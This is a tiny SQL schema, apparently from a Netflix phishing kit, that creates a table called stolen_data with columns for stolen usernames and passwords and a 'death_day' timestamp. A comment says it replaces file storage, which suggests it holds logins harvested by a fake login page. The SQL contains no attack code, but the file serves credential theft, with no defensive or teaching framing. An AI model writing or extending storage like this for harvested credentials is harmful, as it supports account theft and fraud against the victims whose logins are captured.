-- netflix SQL query
-- for using database instead of files
CREATE TABLE stolen_data (
  id INT NOT NULL PRIMARY KEY AUTO_INCREMENT,
  stolen_username VARCHAR(100) NOT NULL,
  stolen_password VARCHAR(255) NOT NULL,
  death_day DATETIME DEFAULT CURRENT_TIMESTAMP
);
